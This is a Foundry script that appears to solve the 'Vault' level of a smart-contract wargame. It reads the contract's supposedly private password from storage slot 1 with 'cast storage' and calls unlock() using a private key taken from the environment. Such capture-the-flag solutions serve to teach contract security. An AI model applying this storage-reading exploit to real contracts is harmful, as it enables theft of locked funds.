// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level08Vault.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level08VaultSolution is Script {
    Vault valutInstance = Vault(0xCEE6BC22334bA3E9CaE9fe774846Dbc295C1216B);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Before locked: ", valutInstance.locked());

        // cast storage 0xCEE6BC22334bA3E9CaE9fe774846Dbc295C1216B 1
        valutInstance.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);

        console.log("After locked: ", valutInstance.locked());
        vm.stopBroadcast();
    }

}